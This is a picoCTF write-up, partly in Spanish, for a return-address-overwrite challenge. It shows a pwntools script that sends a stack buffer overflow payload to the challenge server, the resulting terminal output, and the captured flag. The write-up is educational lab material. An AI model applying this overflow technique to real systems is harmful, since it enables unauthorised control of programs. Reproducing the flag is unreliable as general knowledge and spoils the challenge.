## Objetivo
Control the return address

Additional details will be available after launching your challenge instance.

## Hints


## Solución

```
En nano con nombe exp.py
from pwn import *
p = remote('saturn.picoctf.net',49201)
overflow = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'
print(p.recvuntil(':'))
p.sendline(overflow)
p.interactive()


th0rtilla-picoctf@webshell:~/bufferOver$ python3 exp.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/th0rtilla-picoctf/.cache/.pwntools-cache-3.10/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.8.0 --> 4.9.0).
    Update with: $ pip install -U pwntools
[+] Opening connection to saturn.picoctf.net on port 49201: Done
/home/th0rtilla-picoctf/bufferOver/exp.py:4: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(p.recvuntil(':'))
b'Please enter your string:'
/home/th0rtilla-picoctf/bufferOver/exp.py:5: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(overflow)
[*] Switching to interactive mode
 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}[*] Got EOF while reading in interactive
```
## Bandera
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}